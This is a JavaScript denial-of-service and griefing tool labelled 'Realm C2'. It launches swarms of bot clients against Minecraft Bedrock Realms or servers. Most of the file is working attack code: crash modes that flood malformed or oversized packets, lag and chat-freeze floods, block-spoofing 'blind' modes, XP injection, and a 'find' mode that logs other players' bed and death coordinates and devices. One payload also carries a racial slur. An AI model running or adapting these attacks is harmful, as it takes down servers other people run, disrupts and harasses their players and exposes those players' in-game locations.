const bedrock = require("bedrock-protocol")
const { v4 } = require('uuid')
const { RealmAPI } = require('prismarine-realms')
const { Authflow } = require('prismarine-auth')
const readline = require('readline')
const chalk = require('chalk')

let methods = [
  'crash',
  'crash2',
  'crash3',
  'crash4',
  'crash5',
  'crash6',
  'crash7',
  'crash8',
  'crash9',
  'crash10',
  'crash11',
  'crash12',
  'crash13',
  'lag1',
  'lag2',
  'freeze',
  'blind',
  'xp',
  'blindmodedick',
  'find',
]
let attackId = 0
let lastAttacks = []
const authflow = new Authflow("", "./test")
const api = RealmAPI.from(authflow, 'bedrock')

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
  terminal: true
})

function getTime() {
  const estTime = new Date()
  return estTime.toLocaleTimeString("en-US", { timeZone: "America/New_York" })
}

function logInfo(msg) {
  console.log(chalk.green(`[${getTime()}] ${msg}`))
}

function logError(msg) {
  console.log(chalk.red(`[${getTime()}] ${msg}`))
}

function logInstructions() {
  console.log(`
=======================
      Realm C2
=======================

Commands: 
- lastattacks
- runattack <id>
- clear

Usage:
- <method OR command> <realm_code OR host:port> <client_count> <duration> <ghost_mode:false>

Available Methods:
${methods.map(method => `- ${method}`).join('\n')}

you can copy and paste here
=======================
`)
}

function generateRandomColorCode() {
  const codes = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'd', 'e']
  return '§' + codes[Math.floor(Math.random() * codes.length)]
}

function generateRandomThirdPartyName(length = 18) {
  const chars = 'ABCDEFGHIJKLMNOPQR'
  let result = ''
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length))
  }
  return generateRandomColorCode() + result
}

function sendChatMessage(client, message) {
  client.queue("command_request", {
    command: `me ${message}`,
    origin: {
      type: 0,
      uuid: v4(),
      request_id: v4()
    },
    version: 52,
    internal: false
  })
}

function spawnClient(mode, i, server, duration, ghostMode, doneCallback) {
  let packets = 0
  const clientArgs = {
    username: ``,
    profilesFolder: "./test",
    skinData: {
      CurrentInputMode: 3,
      DefaultInputMode: 3,
      DeviceOS: 11
    },
    conLog: () => { }
  }
  if (typeof server === "object") {
    clientArgs["host"] = server.host
    clientArgs["port"] = server.port
  } else {
    clientArgs["realms"] = {}
    clientArgs["realms"]['realmInvite'] = server

  }

  const client = bedrock.createClient(clientArgs)
  let intervalId = null

  client.on('start_game', () => {
    if (ghostMode && i === 0) {
      client.close()
    }
  })

  client.once('play_status', () => {
    setTimeout(() => {
      client.close()
    }, duration * 1000)
    logInfo(`Bot_${client.options.skinData.ThirdPartyName} Joined. Command: ${mode}`)

    if (mode === 'crash') {
      intervalId = setInterval(() => {
        packets++
        for (let i = 1; i <= 100; i++) {
          client.queue('command_request', {
            command: `/me abc`,
            internal: true,
            version: -i, 
            origin: {
              type: 0,
              uuid: "5123532",
              request_id: "521521",
            }
          })
          client.queue('command_request', {
            command: `/me abc`,
            internal: true,
            version: i,
            origin: {
              type: 0,
              uuid: "21451",
              request_id: "215215",
            }
          })
        }
      }, 100)
    } else if (mode === 'crash2') {
      intervalId = setInterval(() => {
        packets++
        client.queue('inventory_transaction', {
          transaction: {
            legacy: { legacy_request_id: 0 },
            transaction_type: "normal",
            actions: new Array(12345678).fill({
              source_type: "global",
              slot: 2,
              old_item: { network_id: 0 },
              new_item: { network_id: 0 }
            })
          }
        })
      }, 100)
    } else if (mode === 'crash3') {
      intervalId = setInterval(() => {
        packets++
        client.queue("inventory_transaction", {
          transaction: {
            legacy: {
              legacy_request_id: 0
            },
            transaction_type: "normal",
            actions: [{
              source_type: "creative",
              old_item: { network_id: 0 },
              new_item: {
                network_id: 12,
                count: 1,
                has_stack_id: 1,
                stack_id: 1,
                extra: {
                  has_nbt: true,
                  nbt: {
                    version: 1,
                    nbt: {
                      type: "compound",
                      name: "",
                      value: {
                        bundle_id: 1
                      }
                    }
                  },
                  can_destroy: [],
                  can_place_on: [],
                }
              }
            }]
          }
        })
      }, 100)
    } else if (mode === 'crash4') {
      intervalId = setInterval(() => {
        packets++
        client.queue("inventory_transaction", {
          transaction: {
            legacy: {
              legacy_request_id: 0
            },
            transaction_type: "normal",
            actions: [{
              source_type: "creative",
              old_item: { network_id: 0 },
              new_item: {
                network_id: 12,
                count: 1,
                has_stack_id: 1,
                stack_id: 1,
                extra: {
                  has_nbt: true,
                  nbt: {
                    version: 1,
                    nbt: {
                      type: "compound",
                      name: "",
                      value: {
                        Unbreakable: 2
                      }
                    }
                  },
                  can_destroy: [],
                  can_place_on: [],
                }
              }
            }]
          }
        })
      }, 100)
    } else if (mode === 'crash5') {
      intervalId = setInterval(() => {
        packets++
        client.queue('subchunk_request', {
          dimension: 'overworld',
          origin: {
            x: 0,
            y: 0,
            z: 0
          },
          requests: Array.from({ length: 1000000 }, () => ({ dx: 0, dy: 0, dz: 0 }))
        })
      }, 100)
    } else if (mode === 'crash6') {
      intervalId = setInterval(() => {
        packets++
        client.queue("inventory_transaction", {
          transaction: {
            legacy: { legacy_request_id: 0 },
            transaction_type: "normal",
            actions: new Array(99999).fill({
              source_type: "container",
              inventory_id: "inventory",
              slot: 9,
              old_item: { network_id: 0 },
              new_item: { network_id: 0 }
            })
          }
        })
      }, 100)
    } else if (mode === 'crash7') {
      const command = (version, internal) => ({
        command: "/me aaa",
        internal,
        version,
        origin: {
          type: internal ? 5 : 0,
          uuid: "0",
          request_id: "0",
        }
      })
      
      intervalId = setInterval(() => {
        packets++
        for (let i = 0; i < 400; i++) {
          client.queue('command_request', command(-i, true))
          client.queue('command_request', command(i, false))
        }
      }, 100)
    } else if (mode === 'crash8') {
      const rashi = {
        dimension: 0,
        origin: {
          x: 0,
          y: 0,
          z: 0
        },
        requests: new Array(50000).fill({
          dx: 0,
          dy: 0,
          dz: 0
        }),
      }
      
      intervalId = setInterval(() => {
        packets++
        for (let i = 0; i < 500000; i++) {
          client.queue("subchunk_request", rashi)
        }
      }, 100)
    } else if (mode === 'lag1') {
      let players = []
      
      client.on("move_player", (packet) => {
        const listIndex = players.findIndex(entry => entry.runtime === packet.runtime_id)
        if (listIndex != -1) {
          players[listIndex].location = packet.position
        }
      })

      client.on("add_player", (packet) => {
        players.push({
          name: packet.username,
          runtime: packet.runtime_id,
          location: packet.position
        })
      })
      
      intervalId = setInterval(() => {
        packets++
        for (let i = 0; i < 400; i++) {
          for (const player of players) {
            if (player.runtime !== undefined) {
              client.queue("animate", {
                action_id: 4,
                runtime_entity_id: player.runtime
              })
            }
          }
        }
      }, 100)
      
      setTimeout(() => {
        clearInterval(intervalId)
      }, duration * 1000)
    } else if (mode === 'lag2') {
      let players = []
      
      client.on("move_player", (packet) => {
        const listIndex = players.findIndex(entry => entry.runtime === packet.runtime_id)
        if (listIndex != -1) {
          players[listIndex].location = packet.position
        }
      })

      client.on("add_player", (packet) => {
        players.push({
          name: packet.username,
          runtime: packet.runtime_id,
          location: packet.position
        })
      })
      
      intervalId = setInterval(() => {
        packets++
        for (let i = 0; i < 400; i++) {
          for (const player of players) {
            if (player.runtime !== undefined) {
              client.queue("animate", {
                action_id: 5,
                runtime_entity_id: player.runtime
              })
            }
          }
        }
      }, 100)
      
      setTimeout(() => {
        clearInterval(intervalId)
      }, duration * 1000)
    } else if (mode === 'freeze') {
      intervalId = setInterval(() => {
        packets++
        for (let i = 0; i < 100; i++) {
          setTimeout(() => {
            client.queue('text', {
              type: 'chat',
              needs_translation: false,
              source_name: '',
              xuid: '',
              platform_chat_id: '',
              filtered_message: '',
              message: `§0§l§k${"W".repeat(500_000)}`
            })
          }, i * 10)
        }
      }, 1000)
    } else if (mode === 'blind') {
      const size = 10
      const blindMe = false
      
      const blindHandler = (packet) => {
        if (client.entityId !== undefined) {
          const px = packet.position.x
          const py = packet.position.y
          const pz = packet.position.z
          
          for (let dx = 0; dx <= size; dx++) {
            for (let dy = 0; dy <= size; dy++) {
              for (let dz = 0; dz <= size; dz++) {
                client.queue("player_action", {
                  runtime_entity_id: client.entityId,
                  action: 'build_denied',
                  position: { x: px + dx - 2, y: py + dy - 1, z: pz + dz - 2 },
                  result_position: { x: px + dx - 2, y: py + dy - 1, z: pz + dz - 2 }
                })
              }
            }
          }
        }
      }
      
      client.on("move_player", blindHandler)
      if (blindMe) {
        client.on("player_auth_input", blindHandler)
      }
      
      setTimeout(() => {
        client.off("move_player", blindHandler)
        if (blindMe) {
          client.off("player_auth_input", blindHandler)
        }
      }, duration * 1000)
    } else if (mode === 'xp') {
      const xp = 25000
      let players = []
      
      client.on("move_player", (packet) => {
        const listIndex = players.findIndex(entry => entry.runtime === packet.runtime_id)
        if (listIndex != -1) {
          players[listIndex].location = packet.position
        }
      })

      client.on("add_player", (packet) => {
        players.push({
          name: packet.username,
          runtime: packet.runtime_id,
          location: packet.position
        })
      })
      
      intervalId = setInterval(() => {
        packets++
        players.forEach(player => {
          if (player.runtime !== undefined) {
            client.queue('entity_event', {
              runtime_entity_id: player.runtime,
              event_id: 'player_add_xp_levels',
              data: xp
            })
          }
        })
      }, 100)
      
      setTimeout(() => {
        clearInterval(intervalId)
      }, duration * 1000)
    } else if (mode === 'blindmodedick') {
      const positions = [
        { x: -1, z: 0, y: 1 },
        { x: -1, z: 0, y: 2 },
        { x: -1, z: 0, y: 3 },
        { x: -1, z: 1, y: 1 },
        { x: -1, z: -1, y: 1 },
      ]
      let players = []
      
      client.on("move_player", (packet) => {
        const listIndex = players.findIndex(entry => entry.runtime === packet.runtime_id)
        if (listIndex != -1) {
          players[listIndex].location = packet.position
        }
      })

      client.on("add_player", (packet) => {
        players.push({
          name: packet.username,
          runtime: packet.runtime_id,
          location: packet.position
        })
      })
      
      const blindHandler = (packet) => {
        if (client.entityId !== undefined) {
          const px = packet.position.x
          const py = packet.position.y
          const pz = packet.position.z
          
          positions.forEach(pos => {
            client.queue("player_action", {
              runtime_entity_id: client.entityId,
              action: 'build_denied',
              position: { 
                x: px + pos.x, 
                y: py + pos.y, 
                z: pz + pos.z 
              },
              result_position: { 
                x: px + pos.x, 
                y: py + pos.y, 
                z: pz + pos.z 
              }
            })
          })
        }
      }
      
      client.on("move_player", blindHandler)
      client.on("player_auth_input", blindHandler)
      
      setTimeout(() => {
        client.off("move_player", blindHandler)
        client.off("player_auth_input", blindHandler)
      }, duration * 1000)
    } else if (mode === 'find') {
      const locations = { 0: "Overworld", 1: "Nether", 2: "End" }
      const players = []
      const lastPositions = {}
      const runtimeCache = {}

      function safe(str) {
        if (str === undefined || str === null) return 'Unknown'
        return String(str)
      }

      function logPlayerInfo(username, device, bed, lastDied, dimension, permissions) {
        console.log(`\n=== playerinfo ===`)
        console.log(`player: ${safe(username)}`)
        console.log(`device: ${safe(device)}`)
        console.log(`bed: ${bed.x} ${bed.y} ${bed.z}`)
        console.log(`last Death: ${lastDied.x} ${lastDied.y} ${lastDied.z} ${dimension}`)
        console.log(`permissions: ${permissions}`)
        console.log(`========================\n`)
      }

      function logTeleport(username, x, y, z) {
        console.log(`\n=== teleport  ===`)
        console.log(`player: ${safe(username)}`)
        console.log(`coordinates: X: ${x} Y: ${y} Z: ${z}`)
        console.log(`===========================\n`)
      }

      client.on("add_player", (packet) => {
        const runtimeIdStr = String(packet.runtime_id)
        let bedLocation = packet.metadata?.find(entry => entry.key === "player_bed_position") || { value: { x: 0, y: 0, z: 0 } }
        let lastDied = packet.metadata?.find(entry => entry.key === "player_last_death_position") || { value: { x: 0, y: 0, z: 0 } }
        let lastDiedDimension = packet.metadata?.find(entry => entry.key === "player_last_death_dimension") || { value: 0 }
        let dimension = locations[lastDiedDimension.value] || "Unknown"
        let permissions = packet.permission_level || "normal"
        permissions = `${permissions.slice(0, 1).toUpperCase() + permissions.slice(1)}`

        runtimeCache[runtimeIdStr] = { username: packet.username, dimension }

        const idx = players.findIndex(entry => entry.runtime === runtimeIdStr)
        const playerData = {
          runtime: runtimeIdStr,
          username: packet.username,
          position: packet.position,
          uuid: packet.uuid,
          location: packet.position,
          device: {
            deviceId: packet.device_id || "Unknown",
            deviceOs: packet.device_os || "Unknown"
          },
          permissions: permissions,
          dimension: dimension,
          ...(bedLocation.value.x !== 0 && bedLocation.value.y !== 0 && bedLocation.value.z !== 0 ?
            { bedLocations: [bedLocation.value] } : { bedLocations: [] }),
          ...(lastDied.value.x !== 0 && lastDied.value.y !== 0 && lastDied.value.z !== 0 ?
            { lastDied: [lastDied.value] } : { lastDied: [] })
        }
        
        if (idx === -1) {
          players.push(playerData)
          logPlayerInfo(packet.username, packet.device_os, bedLocation.value, lastDied.value, dimension, permissions)
        } else {
          players[idx] = { ...players[idx], ...playerData }
        }
      })

      client.on("move_player", (packet) => {
        const runtimeIdStr = String(packet.runtime_id)
        const pos = packet.position

        let playerObj = players.find(entry => entry.runtime === runtimeIdStr)
        let username = playerObj ? playerObj.username : undefined

        if (!username && packet.username) username = packet.username;
        if (!username) username = 'Unknown';

        if (lastPositions[runtimeIdStr]) {
          const last = lastPositions[runtimeIdStr]
          const dist = Math.sqrt(
            Math.pow(pos.x - last.x, 2) +
            Math.pow(pos.y - last.y, 2) +
            Math.pow(pos.z - last.z, 2)
          )
          if (dist > 20) {
            logTeleport(username, Math.floor(pos.x), Math.floor(pos.y), Math.floor(pos.z))
          }
        }
        lastPositions[runtimeIdStr] = { x: pos.x, y: pos.y, z: pos.z }
      })
    } else if (mode === 'crash9') {
      intervalId = setInterval(() => {
        packets++
        client.queue("inventory_transaction", {
          transaction: {
            legacy: { legacy_request_id: 0 },
            transaction_type: "normal",
            actions: [{
              source_type: "creative",
              old_item: { network_id: 0 },
              new_item: {
                network_id: 12,
                count: 1,
                has_stack_id: 1,
                stack_id: 1,
                extra: {
                  has_nbt: true,
                  nbt: {
                    version: 1,
                    nbt: {
                      type: "compound",
                      name: "",
                      value: {
                        Damage: 999999
                      }
                    }
                  },
                  can_destroy: [],
                  can_place_on: [],
                }
              }
            }]
          }
        })
      }, 100)
    } else if (mode === 'crash10') {
      intervalId = setInterval(() => {
        packets++
        client.queue("inventory_transaction", {
          transaction: {
            legacy: { legacy_request_id: 0 },
            transaction_type: "normal",
            actions: [{
              source_type: "creative",
              old_item: { network_id: 0 },
              new_item: {
                network_id: 12,
                count: 1,
                has_stack_id: 1,
                stack_id: 1,
                extra: {
                  has_nbt: true,
                  nbt: {
                    version: 1,
                    nbt: {
                      type: "compound",
                      name: "",
                      value: {
                        CustomName: "niggermethodahh"
                      }
                    }
                  },
                  can_destroy: [],
                  can_place_on: [],
                }
              }
            }]
          }
        })
      }, 100)
    } else if (mode === 'crash11') {
      intervalId = setInterval(() => {
        packets++
        client.queue("inventory_transaction", {
          transaction: {
            legacy: { legacy_request_id: 0 },
            transaction_type: "normal",
            actions: [{
              source_type: "creative",
              old_item: { network_id: 0 },
              new_item: {
                network_id: 12,
                count: 1,
                has_stack_id: 1,
                stack_id: 1,
                extra: {
                  has_nbt: true,
                  nbt: {
                    version: 1,
                    nbt: {
                      type: "compound",
                      name: "",
                      value: {
                        HideFlags: 999999
                      }
                    }
                  },
                  can_destroy: [],
                  can_place_on: [],
                }
              }
            }]
          }
        })
      }, 100)
    } else if (mode === 'crash12') {
      intervalId = setInterval(() => {
        packets++
        client.queue("inventory_transaction", {
          transaction: {
            legacy: { legacy_request_id: 0 },
            transaction_type: "normal",
            actions: [{
              source_type: "creative",
              old_item: { network_id: 0 },
              new_item: {
                network_id: 12,
                count: 1,
                has_stack_id: 1,
                stack_id: 1,
                extra: {
                  has_nbt: true,
                  nbt: {
                    version: 1,
                    nbt: {
                      type: "compound",
                      name: "",
                      value: {
                        RepairCost: 999999
                      }
                    }
                  },
                  can_destroy: [],
                  can_place_on: [],
                }
              }
            }]
          }
        })
      }, 100)
    } else if (mode === 'crash13') {
      intervalId = setInterval(() => {
        packets++
        client.queue("inventory_transaction", {
          transaction: {
            legacy: { legacy_request_id: 0 },
            transaction_type: "normal",
            actions: [{
              source_type: "creative",
              old_item: { network_id: 0 },
              new_item: {
                network_id: 12,
                count: 1,
                has_stack_id: 1,
                stack_id: 1,
                extra: {
                  has_nbt: true,
                  nbt: {
                    version: 1,
                    nbt: {
                      type: "compound",
                      name: "",
                      value: {
                        CanDestroy: ["minecraft:bedrock"],
                        CanPlaceOn: ["minecraft:bedrock"]
                      }
                    }
                  },
                  can_destroy: [],
                  can_place_on: [],
                }
              }
            }]
          }
        })
      }, 100)

    }
  })

  client.on('error', err => {
    logError(`Bot_${client.options.skinData.ThirdPartyName} Error -> ${err.message}`)
    if (doneCallback) doneCallback(packets)
  })

  client.on('close', () => {
    clearInterval(intervalId)
    if (doneCallback) doneCallback(packets)
  })

  client.on('disconnect', (packet) =>
    logInfo(`Bot_${client.options.skinData.ThirdPartyName} Disconnect -> ${packet.message}`)
  )
}

/*
node --no-deprecation index.js
pkg index.js --targets node18-win-x64,node18-linux-x64,node18-macos-x64

*/

async function handleCommand(command, code, count, duration, ghostMode) {
  try {
    let info
    if (code.includes(":")) {
      info = {
        host: code.split(":")[0],
        port: parseInt(code.split(":")[1])
      }
    } else {
      const realm = await api.getRealmFromInvite(code)
      logInfo(realm.name + ": " + realm.id,)

    }


    let completed = 0
    let totalPackets = 0
    const onClientDone = (packets) => {
      totalPackets += packets
      completed++
      if (completed === count) {
        logInfo(`Finished ${command} To ${completed} Clients. ${totalPackets} Packets Sent.`)
        rl.prompt()
      }
    }

    for (let i = 0; i < count; i++) {
      spawnClient(command, i, code.includes(":") ? { host: info.host, port: info.port } : code, duration, ghostMode, onClientDone)
    }

    logInfo(`Started ${count} Clients, Sending ${command} Command.`)
  } catch (err) {
    logError(`Failed To Connect: ${err.message}.`)
    rl.prompt()
  }
}

async function startC2() {
  console.clear()

  logInstructions()
  rl.setPrompt('[C2]>> ')
  rl.prompt()

  rl.on('line', async input => {

    let cleanInput = input.trim().replace(/\r?\n/g, ' ').replace(/\s+/g, ' ')
    let [command, code, countStr, duration, ghostMode] = cleanInput.split(' ')
    command = command.toLowerCase()
    ghostMode = ghostMode ? true : false
    if (command === "clear") {
      console.clear()
      logInstructions()
      rl.prompt()
      return
    } else if (command === "lastattacks") {
      let attackStr = lastAttacks.map(entry => `#${entry.attackId} - ${entry.method} ${entry.host} ${entry.clients} ${entry.duration} ${entry.ghostMode ? "True" : ""}`).join("\n")
      logInfo(`${attackStr.length > 0 ? "\n" + attackStr : "None"}`)
      rl.prompt()

    } else if (command === "runattack") {
      let found = false
      lastAttacks.forEach(async (attack) => {
        if (code == attack.attackId) {
          found = true
          return await handleCommand(attack.method, attack.host, attack.clients, attack.duration, attack.ghostMode)
        }
      })
      if (!found) {
        rl.prompt()
      }
    } else if (!methods.includes(command) || !code || isNaN(parseInt(countStr))) {
      logError('<method> <realm_code OR host:port> <clients> <duration> <ghost_mode:false>')
      rl.prompt()
      return
    } else {

              if (input.includes('\n') || input.includes('\r')) {
          logInfo(`Command processed: ${command} ${code} ${countStr} ${duration} ${ghostMode}`)
        }
      lastAttacks.push({
        method: command,
        attackId: attackId,
        host: code,
        clients: parseInt(countStr),
        duration: duration,
        ghostMode: ghostMode
      })
      attackId++
      await handleCommand(command, code, parseInt(countStr), duration, ghostMode)
    }

  })
}


startC2()
